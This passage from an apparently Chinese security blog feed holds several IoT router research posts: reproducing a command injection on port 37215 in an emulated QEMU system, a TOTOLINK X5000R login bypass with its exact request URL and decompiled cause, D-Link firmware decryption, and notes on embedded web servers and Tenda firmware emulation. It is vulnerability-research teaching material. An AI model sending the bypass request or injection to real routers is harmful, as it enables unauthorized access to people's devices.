-nographic</code></pre></div><blockquote><p> 如果你的多次运行qemu，可能会出现如下错误</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140619011.png" alt="image-20220402140619011"></p><p>这是服务没有退出导致的</p><p>ps查出当前qemu进程号，kill掉就好了</p><p>ps -e | grep ‘qemu’ </p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140624914.png" alt="image-20220402140624914"></p><p>sudo kill 3307</p><p>即可</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140630469.png" alt="image-20220402140630469"></p><p>启动如上图，账号密码都是root</p><p>启动后尝试，ping baidu.com 和 ubuntu</p><p>如果不通</p><div class="code-wrapper"><pre><code class="hljs sh">ifconfig -a</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140637098.png" alt="image-20220402140637098"></p><p>查看网卡第一个是什么，一般都会是<code>eth1</code></p><p>然后修改<code>/etc/network/interfaces</code>，注意这里是在qemu虚拟机中修改</p><div class="code-wrapper"><pre><code class="hljs awk">nano <span class="hljs-regexp">/etc/</span>network/interfaces</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140644738.png" alt="image-20220402140644738"></p><p>第一次配置红框中一般是eth0，将红框中的内容修改为你的网卡名字</p><p>保存后使用下面指令重启eth1</p><div class="code-wrapper"><pre><code class="hljs sh">ifup eth1</code></pre></div><p>再次尝试，如果还不行或者ifconfig发现eth1没有分配地址，重启ubuntu或者找原因🤔，不行就恢复快照</p><p>如果成了的话是可以用ssh远程连接qemu虚拟机的</p><div class="code-wrapper"><pre><code class="hljs sh">ssh root@虚拟机ip</code></pre></div><p>建议在ubuntu中使用ssh连接，比较方便</p><p>接下来将我们解压出来的文件系统拷贝到qemu</p><div class="code-wrapper"><pre><code class="hljs sh">scp -r ./squashfs-root  root@虚拟机ip:/root/</code></pre></div><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>通过checkpoint报告中能看到关键字为<code>ctrl</code>和<code>Deviceupgrade</code>，端口号为<code>37215</code></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/GzpgZHDk4ARtbdx.png" alt="image-20210902150556461"></p><p>使用grep来查找</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140700858.png" alt="image-20220402140700858"></p><p>两个都指向upnp这个文件，端口号指向mic这个文件</p><p>直接运行会出问题，我们切换根目录到拷贝进来的系统文件中</p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">chroot</span> /root/squashfs-root /bin/sh</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140706608.png" alt="image-20220402140706608"></p><p>然后先后运行upnp和mic</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140714604.png" alt="image-20220402140714604"></p><p>到这个地方mic已经运行成功了，放着不用管他了</p><p>使用lsof -i:37215可以查看端口是否运行</p><p>用下面命令来查看是否启动成功</p><div class="code-wrapper"><pre><code class="hljs sh">nc -vv 192.168.150.9 37215</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140722740.png" alt="image-20220402140722740"></p><p>成功了就可以跑exp了</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140729357.png" alt="image-20220402140729357"></p><p>与checkpoint不同的是，我把溢出的命令修改了（红框处，这里就是灵活使用了），蓝框处修改为qemu的ip</p><p>执行exp后 在mic界面可以看到</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140738261.png" alt="image-20220402140738261"></p><p>ls被成功执行了。</p><h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>Ida7.5可以反编译qemu🥳</p><p>通过exp能发现，命令行放在了NewStatusURL标签下，在ida中通过字符串查找</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140745136.png" alt="image-20220402140745136"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140751334.png" alt="image-20220402140751334"></p><p>49c的位置使用快捷间p可以创建函数，来反编译</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140806829.png" alt="image-20220402140806829"></p><p>snprintf函数将可变个参数按照format格式化成字符串，然后将其复制到str中，即把v5与前面字符串拼接放到v6中，并且system执行了v6</p><p>根据exp的执行效果来推测，ATP_XML_GetChildNodeByName这个函数读取NewStatusURL标签的内容放到了v5。</p><p>伪代码不可信，尽量还是通过汇编代码分析</p><p>倒推能发现，system的参数为<code>0x42C+var_414($sp)</code></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140813521.png" alt="image-20220402140813521"></p><p><code>0x42C+var_414($sp)</code>为snprintf 的第一个参数，<code>0x42C+var_40C($sp)</code>为snprintf的第四个参数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140822142.png" alt="image-20220402140822142"></p><p>即 <code>0x42C+var_40C($sp)</code>的内容通过函数放到了<code>0x42C+var_414($sp)</code></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140829308.png" alt="image-20220402140829308"></p><p>而<code>0x42C+var_40C($sp)</code>为ATP_XML_GetChildNodeByName的一个参数，这里应该是读取后放到了<code>0x42C+var_40C($sp)</code></p><blockquote><p>ida的锅🙃，没有办法ATP_XML_GetChildNodeByName做具体分析，但通过网上一些师傅的文章，应该大差不差了</p></blockquote><p>然后了解原理我们就可以通过闭合来实现命令运行了。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>totolink后台登录绕过</title>
    <link href="/article/b3e9da69.html"/>
    <url>/article/b3e9da69.html</url>
    
    <content type="html"><![CDATA[<p>型号：<a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">X5000R</a></p><p><a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">AX1800 无线双频千兆路由器</a></p><p>下面有分析思路，设备模拟过程比较靠近新手，师傅们可以直接跳到后面分析过程。</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140113553.png" alt="image-20220402140113553"></p><p>登陆页面构造参数，无需密码</p><p><a href="http://192.168.0.1/formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login">formLoginAuth.htm?authCode&#x3D;1&amp;action&#x3D;login</a></p><p>可直接绕过登陆，进入后台</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140132386.png" alt="image-20220402140132386"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140143666.png" alt="image-20220402140143666"></p><p>产生原因在lighttpd wen服务文件from_login函数中</p><p> <img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140151857.png" alt="image-20220402140151857"></p><div class="code-wrapper"><pre><code class="hljs c++"> <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;  iVar1 = <span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *)&amp;sa58,<span class="hljs-string">&quot;ie8&quot;</span>);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;   pcVar1 = <span class="hljs-string">&quot;/login_ie.html&quot;</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;   iVar1 = <span class="hljs-built_in">atoi</span>((<span class="hljs-type">char</span> *)&amp;sa58);   <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;​    pcVar2 = <span class="hljs-string">&quot;/login.html&quot;</span>;​    pcVar1 = <span class="hljs-string">&quot;http://%s%s%s&quot;</span>;​    pcVar3 = <span class="hljs-string">&quot;/phone&quot;</span>;LAB_409114:​    <span class="hljs-built_in">sprintf</span>(param_2,pcVar1,acStack1860,pcVar3,pcVar2);​    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;   &#125;   pcVar1 = <span class="hljs-string">&quot;/login.html&quot;</span>;  &#125;  <span class="hljs-built_in">sprintf</span>(param_2,<span class="hljs-string">&quot;http://%s%s&quot;</span>,acStack1860,pcVar1);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;</code></pre></div><p>上面代码是登陆检查，当iVar2&#x3D;1的时候，直接跳过检查，不需要登陆。</p><p>iVar2的值是autoCode参数的值。</p><p>所以构造autoCode&#x3D;1即可绕过。</p><hr><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>下面是详细分析思路。</p><p>今天偶然发现这款非常小众的路由器，至于多小众，我分析这款官方月销15台。</p><p>我分析的这款是 AX1800，官方可以直接下载固件。</p><p>这款固件超级适合新手第一次分析使用。</p><p>binwalk分析</p><div class="code-wrapper"><pre><code class="hljs bash">binwalk TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140204590.png" alt="image-20220402140204590"></p><p>squashfs文件系统，uImage，LZMA压缩文件中应该也是个比较大的内容，直接使用-Me参数递归提取。</p><div class="code-wrapper"><pre><code class="hljs bash">binwalk -Me TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140212668.png" alt="image-20220402140212668"></p><p>里面有标准的文件系统</p><p>查看架构</p><div class="code-wrapper"><pre><code class="hljs bash">binwalk ./bin/busybox</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140219607.png" alt="image-20220402140219607"></p><p>mips小端序，查看其文件系统瞅瞅有没有什么东西。</p><p>有个工具叫firmwalker，可以自动分析文件系统，提取重要文件，我个人觉得不是特别好用。</p><p>我比较推荐使用vscode来做分析。</p><p>下面是要关注的一些地方</p><div class="code-wrapper"><pre><code class="hljs bash">etc/ <span class="hljs-comment">#这里会存放系统启动文件如openwrt的rcS文件</span>sbin/ <span class="hljs-comment">#这里一般会存放厂商制作的功能性文件和提供web服务的文件</span>www/ <span class="hljs-comment">#这里会存放一些web静态页面和后台服务文件文件</span></code></pre></div><p>其他地方也尽量看一下，经验多了就容易清楚哪些文件是做什么的了，没经验就慢慢来。</p><p>这里发现了这几个文件：</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140228610.png" alt="image-20220402140228610"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140234876.png" alt="image-20220402140234876"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140239433.png" alt="image-20220402140239433"></p><p>可以看到他使用了lighttpd 的web服务文件，</p><p>一般固件大概会有这几个轻量级httpd文件：lighttpd，httpd，uhppd。</p><p>  其他的还有很多。</p><p>尝试使用qemu-user模拟http服务。</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> (<span class="hljs-built_in">which</span> qemu-mipsel-static) ./sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./usr/sbin/lighttpd</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140244941.png" alt="image-20220402140244941"></p><p>这里的报错是需要用-f参数指定配置文件，上面已经发现了lighttpd.conf文件。</p><div class="code-wrapper"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140250832.png" alt="image-20220402140250832"></p><p>没有这个文件，这里我们先去把这个路径改一下，在lighttpd.conf中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140256520.png" alt="image-20220402140256520"></p><p>把它改到固件的系统文件中<code>./var/run/lighttpd.pid</code>，并且去创建这个文件。</p><p>运行</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140301896.png" alt="image-20220402140301896"></p><p>这里虽然正常启动，但是如果不挂载文件夹，还是挺多问题的，所以我更倾向使用系统模式。</p><p>所以下面的分析都是在系统模式下的。</p><p>这里系统模式不做赘述，我写了个脚本，可以很方便启动。</p><p>核心文件比较大，大家按文件自行下载</p><p><a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></p><p>我把脚本放链接放这里</p><p><a href="https://gitee.com/p1piyang/backward-analysis/tree/master/">https://gitee.com/p1piyang/backward-analysis/tree/master/</a></p><p>qemu启动</p><div class="code-wrapper"><pre><code class="hljs bash">sudo ./start-mipsel.sh</code></pre></div><p>sudo 启动</p><div class="code-wrapper"><pre><code class="hljs bash">ifconfig eth0 192.168.5.12 up <span class="hljs-comment">#qemu中设置ip，qemu里边</span></code></pre></div><p>将文件系统上传</p><div class="code-wrapper"><pre><code class="hljs bash">scp -r squashfs-root/ root@192.168.5.12:/root/  <span class="hljs-comment">#在主机</span></code></pre></div><p>挂载</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> ./squashfs-root/ /bin/sh</code></pre></div><p>启动</p><div class="code-wrapper"><pre><code class="hljs bash">./user/sbin/lighttpd -f ./lighttp/lighttpd.conf</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140309147.png" alt="image-20220402140309147"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>刚开始是想直接去分析lighttpd的。随手登陆了一下，看了下包。</p><blockquote><p> 我个人浅薄的经验，不要单纯去无目的的分析某个应用，我之前犯过这种错误，太容易对着一个程序漫无目的的乱逛，希望你没有这种情况。</p></blockquote><p>这里明显可以看到调用了cgi文件，之前看文件的时候看到了这个东西的。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140319324.png" alt="image-20220402140319324"></p><p>可以去分析下这个文件。</p><div class="code-wrapper"><pre><code class="hljs sql">ghidra <span class="hljs-keyword">open</span>！！！Link 死大头！！！<span class="hljs-keyword">search</span> &quot;action&quot;！！！</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140324232.png" alt="image-20220402140324232"></p><p>action&#x3D;login，交叉引用，看一下。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140332012.png" alt="image-20220402140332012"></p><p>说实话，ghidra的这个伪代码看着老奇怪了，这里是判断了登陆还是升级。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140340535.png" alt="image-20220402140340535"></p><p>if下面，这里判断flag&#x3D;1，最后的逻辑是将字符串格式化到<code>acStack4456</code>中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140405176.png" alt="image-20220402140405176"></p><p>再往下这个地方我刚开始比较懵了，因为<code>websGetVar程序查找表变量var</code>,相当于获取参数。所以这里并没有往下看，而是换了个思路点。</p><p>这里知道了他是对登陆做了个判断。</p><p>去查找登陆的请求参数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140416345.png" alt="image-20220402140416345"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140422127.png" alt="image-20220402140422127"></p><p>发现了这么个地方。</p><p>根据登陆的包。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140429266.png" alt="image-20220402140429266"></p><p>发现他返回了一串地址。并且主动访问了这串地址。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140435525.png" alt="image-20220402140435525"></p><p>所以这个地方是判断密码的地方。本来想试试正确密码，来分析下，结果密码怎么都不对。</p><p>这里解释下，因为我没有设备，是直接在官网下载的固件，所以这个密码怎么都不对，我怀疑是固件模拟的问题，就没有往下追究。</p><p>他主动访问了formloginAuth.htm，在www&#x2F;文件夹下并没有这个文件，所以去找下lighttpd文件分析下</p><div class="code-wrapper"><pre><code class="hljs sql">ghidra <span class="hljs-keyword">open</span>！！！Link 死大头！！！<span class="hljs-keyword">search</span> &quot;formLoginAuth&quot;！！！</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140442157.png" alt="image-20220402140442157"></p><p>跟进from_Login函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140458964.png" alt="image-20220402140458964"></p><p>这里就发现了参数处理</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140507794.png" alt="image-20220402140507794"></p><p>判断几个参数做了什么，userName是空的先不看，goURL是某个html文件，盲猜他是的从哪来的，action是要做什么。</p><p>所以现在要看一下authCode</p><p>如果authCode不等于0，iVar2就等于整形的authCode的值。</p><p>往下分析。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140512311.png" alt="image-20220402140512311"></p><p>这里改成1之后直接，跳过了这个判断。</p><p>但是只吧这个改为1之后还是返回到登陆界面。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140520920.png" alt="image-20220402140520920"></p><p>这里pcVar2&#x3D;1，导致跳过了设置pcVar2 &#x3D; home.html</p><p>所以我猜测goUrl参数不是从哪来，而是从哪去。</p><p>最后发现果然是哦。</p><p>其实在ghidra反编译的时候，好多地方不太习惯，很多地方靠函数名和字符串硬猜。</p><p>慢慢来吧。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>路由器固件解密思路</title>
    <link href="/article/876237c8.html"/>
    <url>/article/876237c8.html</url>
    
    <content type="html"><![CDATA[<p>学习思路来源于zdi：<code>https://www.zerodayinitiative.com/blog/2020/2/6/mindshare-dealing-with-encrypted-router-firmware</code></p><p>关于如何判断是否加密在另一篇文章有提到： <code>https://p1yang.github.io/2022/04/02/iot/iot学习感悟/</code></p><p>一般来说固件加密有三种情况：</p><ol><li>初始版本未加密，后续某个版本加密了 在加密与初始版本中间某个版本附带了解密程序</li></ol><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427111553846.png" alt="image-20220427111553846"></p><p>​        获取中间版本，从中分析解密程序。</p><ol start="2"><li>老版有加密，后续更换加密方式，中间发布未加密的过渡版本固件</li></ol><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427113725651.png" alt="image-20220427113725651"></p><p>​        与1类似，也是同样获取带有解密程序的过渡版本固件分析提取解密程序</p><ol start="3"><li>老版有加密，后续更换加密方式，中间更换了新的未加密的解密程序</li></ol><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427114528196.png" alt="image-20220427114528196"></p><p>​        如果清楚早期加密方式，或者拥有早期解密程序，可以去分析更换解密程序的中间版本，来获取解密程序。</p><p>​        如果没有早期相关解密信息，则无法使用上面方式，更多是购买设备，从硬件直接提取未加密的固件。</p><p>​        理论上，可以使用二进制对比分析工具，来分析尝试提取复原解密程序。</p><p>这是选用了经典的Dlink-DIR882的固件进行分析：</p><p>ftp：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/</a></p><p>从固件时间顺序往早期查验</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427115925211.png" alt="image-20220427115925211"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427120035013.png" alt="image-20220427120035013"></p><p>发现<code>DIR882A1_FW104B02_Middle_FW_Unencrypt.bin</code>就是我们所说的过渡版本。</p><p>提取，分析，我们要通过他来查找解密程序。</p><p>或者复现根据升级路径来查找。</p><p>这里比较幸运通过关键字查到在bin下的imgdecrypt，但我们不能确定他一定是正确的解密程序</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427143219538.png" alt="image-20220427143219538"></p><p>我们尝试执行他。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427151046949.png" alt="image-20220427151046949"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427151221942.png" alt="image-20220427151221942"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427151356109.png" alt="image-20220427151356109"></p><p>跟上面对比，正确能够被识别出文件。</p><p>尝试将其他固件也都测试下</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427152259592.png" alt="image-20220427152259592"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220427152314636.png" alt="image-20220427152314636"></p><p>上面是命名比较规范的一种，有些命名不规范可能需要去根据前端升级去寻找相应的功能。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>iot学习感悟</title>
    <link href="/article/41f88cb3.html"/>
    <url>/article/41f88cb3.html</url>
    
    <content type="html"><![CDATA[<h1 id="关于加密"><a href="#关于加密" class="headerlink" title="关于加密"></a>关于加密</h1><p>前期接触iot我们遇到固件基本都是binwalk一把梭，但有时候会遇到固件信息混乱，或者分析出来一堆zlma的文件，没有发现有rtos或者文件系统的标志。</p><p>这时候会考虑到是否加密，上网查会发现有用 binwalk 的 -E 参数来判断。</p><p>那么这个判断的原理是啥？</p><p>原理是信息熵。</p><blockquote><p> 熵：泛指某些物质系统状态的一种量度，某些物质系统状态可能出现的程度。</p></blockquote><p>初高中应该都学过，熵值越大，说明系统越混乱。</p><blockquote><p> 信息熵：1948年C.E.Shannon（香农）从热力学中借用过来提出的概念，解决了对信息的量化度量问题</p></blockquote><p>信息中，重复的内容越多，系统越稳定，能获得的信息越多。</p><blockquote><p>对于没有加密的二进制文件来说，某些指令出现的频率通常很高（如序言、nop序列等），并且数据结构几乎没有随机性。重复概率很高</p></blockquote><p>所以，对于未加密的数据来说熵值一般会比较低。</p><blockquote><p>对于经过加密的文件来说，都会想尽办法隐藏自己的信息，而导致很少有重复的内容，也就导致重复概率低</p></blockquote><p>所以，加密的熵值一般都会高。</p><p>上面就是通过信息熵来判断是否加密，binwalk使用相关算法来整理信息熵</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140534018.png" alt="image-20220402140534018"></p><h1 id="关于web服务"><a href="#关于web服务" class="headerlink" title="关于web服务"></a>关于web服务</h1><p>嵌入式的web服务通常是cgi+http 或 lua+http</p><p>cgi是叫公共网关接口，是Web 服务器运行时外部程序的规范，按<em>CGI</em> 编写的程序可以扩展服务器功能</p><p><em>Lua</em> 是一种轻量小巧的脚本语言,用标准C语言编写并以源代码形式开放, 其设计目的是为了嵌入应用程序中,从而为应用程序提供灵活的扩展和定制功能。</p><p>常见的嵌入式设备使用的web服务多为以下几款</p><h2 id="boa"><a href="#boa" class="headerlink" title="boa"></a>boa</h2><p>单一任务型的http服务器，只会对CGI请求进行<code>fork</code>进程，没有访问控制功能，身份认证都是厂商后边开发的。</p><p>通过<code>translate_uri</code>函数解析请求路径I判断是否为CGI请求，调用<code>init_cgi</code>来<code>execve</code>执行相关CGI程序</p><p><code>translate_uri</code>函数中的<code>init_script_alias</code>函数，负责解析<code>ScriptAlias</code>请求，设置请求cgi类型，查看文件是否存在以及具有相关权限</p><p>通过<code>ScriptAlias</code>在<code>boa.conf</code>配置文件中，该指令设置CGI执行的真实目录</p><blockquote><p>不止是boa，nginx的设置中也存在alias，小米路由器就曾因为这个设置导致路径穿越</p></blockquote><h2 id="uhttpd"><a href="#uhttpd" class="headerlink" title="uhttpd"></a>uhttpd</h2><p>openwrt的默认http服务器，主要是为了和LucI Web接口方便OpenWrt设备管理。</p><p>支持与cgi，lua，UBUS来完成请求。</p><p>uhttpd使用LuCI框架编写lua处理脚本，安全审计偏向于Web安全中的代码审计。</p><p>但也有一些存放的lua脚本是编译过的，需要逆向。</p><p>uhttp下<code>dispatch_find</code>函数根据请求的url找到合适的<code>dispatch_handler</code>。</p><p>请求的url通过<code>check_cgi_path</code>函数校验，则会调用<code>cgi_handle_request</code>函数回调<code>cgi_main</code>函数<code>execl</code>执行对应的CGI程序</p><p>最终调用的<code>/www/cgi-bin/luci</code>即Luci，luci是MVC设计思想的web后端框架。</p><p>简单了解下，后面一款小米路由器分析思路会详细介绍</p><h2 id="Goahead"><a href="#Goahead" class="headerlink" title="Goahead"></a>Goahead</h2><p>在<code>route.txt</code>定义的路由规则，根据匹配的URI来执行不同的handler：有action handler直接在GoAhead进程中执行C函数，CGI handler执行新的CGI程序，也有默认的file handler处理文件请求，还可以自定义新的handler</p><p>详细请看官方文档：<a href="https://www.embedthis.com/goahead/doc/">https://www.embedthis.com/goahead/doc/</a></p><p>调用<code>websUrlHandlerRequest</code>函数找到匹配URL前缀的处理函数，可以借助<code>websFormDefine</code>函数定义与<code>formName</code>相关联的C处理函数</p><p>由上面几个可以看出来，都是通过URL来选择执行CGI&#x2F;lua或是内部程序</p><p>并且根据<code>PATH_INFO</code>选择执行程序内最终的handler函数。</p><p>这里属于个人复述，这个文章比较详细：<a href="https://github.com/Larryxi/Larryxi.github.io/blob/master/_posts/2020-02-03-iot-web-server-cgi-handler-analysis.md">https://github.com/Larryxi/Larryxi.github.io/blob/master/_posts/2020-02-03-iot-web-server-cgi-handler-analysis.md</a></p><h1 id="分析的一些思路"><a href="#分析的一些思路" class="headerlink" title="分析的一些思路"></a>分析的一些思路</h1><p>分析的话根据上面的东西来看</p><p>一定要有个设备，或者去模拟这些设备。</p><p>保证正常的web访问，方便查看功能调用的url&#x2F;接口。</p><blockquote><p>一定不要去公网站直接用人家的设备，要做个守法的好孩子！！！</p></blockquote><p>根据上面的知识来获取相关功能的具体实现位置。</p><p>然后分析危险函数，以及是否可控。</p><p>或者</p><p>从危险函数向外分析功能点。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tenda路由器的漏洞发现</title>
    <link href="/article/44df6587.html"/>
    <url>/article/44df6587.html</url>
    
    <content type="html"><![CDATA[<p>分析这款是tendaA1206，固件是比较早的未加密的那个。</p><p>都是些个人学习过程中的思考与知识，整理下来。</p><p>固件在这：<code>https://p1yang.github.io/2022/04/22/iot/tenda路由器的漏洞发现/</code></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>都是些老生常谈的东西可以跳过。</p><p>这里使用的qemu-user，方便</p><p>至于分析的文件在下面思路中会聊到，这里环境模拟启动的是&#x2F;bin&#x2F;httpd 文件</p><p>复现环境是qemu+ghidra(反编译伪代码，我个人比较习惯ghidra的伪代码)+ida7.5(动态调试)</p><p>binwalk解包，文件格式，qemu-user模式启动等这些就不赘述，主要说几个环境模拟时的几个小问题。</p><h2 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422093901642.png" alt="image-20220422093901642"></p><p>第一次运行时爆出这个错误停止。string大法发现在main中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422094037256.png" alt="image-20220422094037256"></p><p><code>apmib_init</code>函数从flash中读取mib值到RAM中，像这种模拟是办不到的东西，直接patch代码或更改寄存器值来绕过(尝试了下没办法直接patch代码，可以试试patch机器码，比较麻烦，我就直接改寄存器了)</p><p>在mips的判断是bne，btgz等，将断点下在他们上，他们通常依靠v0寄存器的值来做判断。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422094858896.png" alt="image-20220422094858896"></p><p>此时v0值为0，改为1跳过</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095038420.png" alt="image-20220422095038420"></p><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>这里陷入个死循环，问题点在</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422101918935.png" alt="image-20220422101918935"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422102003495.png" alt="image-20220422102003495"></p><p>也尝试更改寄存器v0的值成功绕过。</p><h2 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095242595.png" alt="image-20220422095242595"></p><p>继续string大法</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095310053.png" alt="image-20220422095310053"></p><p>抱歉这里我并没有查到这个函数的是干什么的，有清楚的请告诉我，提前感谢。</p><p>不影响，改寄存器大法。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095958809.png" alt="image-20220422095958809"></p><h2 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h2><p>上面没问题之后发现ip开在<code>255.255.255.255</code>上。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422102645100.png" alt="image-20220422102645100"></p><p>string大法搜 listen ip</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422103034994.png" alt="image-20220422103034994"></p><p><code>inet_ntoa</code>函数的意思是，功能是将网络地址转换成“.”点隔的字符串格式。</p><p>所以跟sockaddr.sin_port有关，查看引用</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422103359077.png" alt="image-20220422103359077"></p><p><code>inte_addr</code> 功能是将一个点分十进制的IP转换成一个长整型数（u_long类型）等同于<em>inet_addr</em>()。</p><p>与host有关，再向前查看</p><p><img 